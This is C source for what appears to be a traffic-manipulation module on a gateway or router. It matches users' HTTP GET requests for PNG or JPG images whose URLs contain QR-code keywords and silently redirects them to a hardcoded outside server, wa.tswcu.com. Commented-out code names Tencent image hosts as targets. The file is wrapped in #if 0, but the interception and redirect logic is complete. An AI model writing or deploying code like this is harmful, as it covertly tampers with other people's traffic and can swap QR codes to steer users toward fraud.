#if 0
#include "ha_qrCode.h"
#include <string.h>

#include "list.h"

#include "ha_policy.h"
#include "ha_debug.h"
#include "ha_network.h"
#include "ha_30x.h"
#include "ha_config.h"
#include "ha_search.h"
#include "ha_http_type.h"

#define DEF_QRCODE_PATH 	"/qrCode/statistic.php"
#define DEF_QRCODE_SERVER 	"wa.tswcu.com"

struct ha_qrCode_ctl
{
    char server[DEF_SRV_MAXLEN];
    char path[DEF_URL_MAXLEN];
};
static struct ha_qrCode_ctl qrCode_ctl = {};

struct ha_qrCode_sign{
	cstr_t key;
	bool (*guess)(struct ha_http_request *);
};
static char qrCode_keywords_1[] = ".png";
static char qrCode_keywords_2[] = ".jpg";
#if 0
static char qrCode_host_1[] = "game.gtimg.cn";
static char qrCode_host_2[] = "ossweb-img.qq.com";
#endif
static char qrCode_subKey_1[] = "code";
static char qrCode_subKey_2[] = "down";
static char qrCode_subKey_3[] = "spr";
static char qrCode_subKey_4[] = "ewm";

#if 0
static struct ha_qrCode_sign qrHostKey[] = 
{
	{
		.key = {.str = qrCode_host_1, .len = sizeof(qrCode_host_1) - 1},
	},
	#if 1
	{
		.key = {.str = qrCode_host_2, .len = sizeof(qrCode_host_2) - 1},
	},
	#endif
	{
		.key = {NULL,0},
	}
};
#endif
static struct ha_qrCode_sign qrkeys[] = 
{
	{
		.key = {.str = qrCode_keywords_1, .len = sizeof(qrCode_keywords_1)-1},
	},
	#if 1
	{
		.key = {.str = qrCode_keywords_2, .len = sizeof(qrCode_keywords_2)-1},
	},
	#endif
	{
		.key = {NULL,0},
	}
};
#if 1
static struct ha_qrCode_sign subkey[] = 
{
	{
		.key = {.str = qrCode_subKey_1, .len = sizeof(qrCode_subKey_1)-1},
		
	},
	{
		.key = {.str = qrCode_subKey_2, .len = sizeof(qrCode_subKey_2)-1},
		
	},
	{
		.key = {.str = qrCode_subKey_3, .len = sizeof(qrCode_subKey_3)-1},
		
	},
	{
		.key = {.str = qrCode_subKey_4, .len = sizeof(qrCode_subKey_4)-1},
		
	},
	{
		.key = {NULL,0},
	}
};
#endif
static bool ha_cofirm_key_qr(cstr_t *thekey, struct ha_http_request *req)
{
	return UINT32_MAX != raw_search((const uchar*)thekey->str,thekey->len,(const uchar *)req->url.str,req->url.len,true);
}
#if 0
static bool ha_host_match(cstr_t *host_key,cstr_t *host)
{
	return UINT32_MAX != raw_search((const uchar *)host_key->str,host_key->len,
									  (const uchar *)host->str,host->len,true);
}
#endif
static bool ha_is_thekey(struct ha_qrCode_sign * hqs,struct ha_http_request * req)
{

	struct ha_qrCode_sign *s = hqs;
	while(s->key.str)
	{
		if(ha_cofirm_key_qr(&s->key,req))
			return true;
		s++;
	}
	return false;
}
#if 0
static bool ha_is_thehost(struct ha_qrCode_sign * hqs,struct ha_http_request * req)
{

	struct ha_qrCode_sign *s = hqs;
	while(s->key.str)
	{
		if(ha_host_match(&s->key,req->host))
			return true;
		s++;
	}
	return false;
}
#endif
static bool ha_is_target_qr(struct ha_http_request *req, cstr_t *ua)
{
    assert(req&&ua);
    struct ha_qrCode_sign *c = qrkeys;
	//struct ha_qrCode_sign *hostkey = qrHostKey;
	struct ha_qrCode_sign *sub_c = subkey;
	bool bret = false;
	//is the host or not
	//bool bret = ha_is_thehost(hostkey,req);
	//if(!bret)
		//return bret;
	//is png,jpg or not
	bret = ha_is_thekey(c,req);
	if(!bret)
		return bret;
	//is the sub key words or not
	bret = ha_is_thekey(sub_c,req);
	return bret;
}

static bool ha_qrCode_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{
    bool res = true;
	//debug_p("__QR_CODE__ Register");
    struct ha_qrCode_ctl *ctl = &qrCode_ctl;
    if(type != HTTP_GET)
        return true;
 
    
    
    if(!ha_is_target_qr(req,req->ua))
        goto end;
   
    if(!ha_build_redir_args(req,req->ua,"png",pi,false))
		goto end;
	
	ha_http_redirect(pi,"http",ctl->server,ctl->path,ha_escap_buffer_get(),1);
	res = false;
end:
    return res;
}
#if 1
/* server & path config */
static void ha_qrCode_conf_init(struct ha_qrCode_ctl *ctl)
{
    struct json_object *jo = ha_find_module_config("qr_code");
    if(!jo)
        return;
  
    const char *str = ha_json_get_string(jo,"server");
    if(str)
        strncpy(ctl->server,str, sizeof(ctl->server));
   
    str = ha_json_get_string(jo,"path");
    if(str && strlen(str) > 1)
        strncpy(ctl->path, str, sizeof(ctl->path));
}
#endif
bool ha_qrCode_init(void)
{
	debug_p("__QR_CODE__ INIT");
    struct ha_qrCode_ctl *ctl = &qrCode_ctl;
    strncpy(ctl->server, DEF_QRCODE_SERVER, sizeof(ctl->server));
    strncpy(ctl->path, DEF_QRCODE_PATH, sizeof(ctl->path));

    while(0)
		ha_qrCode_conf_init(ctl);

    ignore_server(ctl->server,strlen(ctl->server));
	
    proto_pseudo_server_register(ctl->server);
    ha_http_type_handler_register("qrCode_replace",ha_qrCode_handler);
	debug_p("__QR_CODE__ INIT_1");
    return true;
}

void ha_qrCode_destroy(void)
{

}
#endif

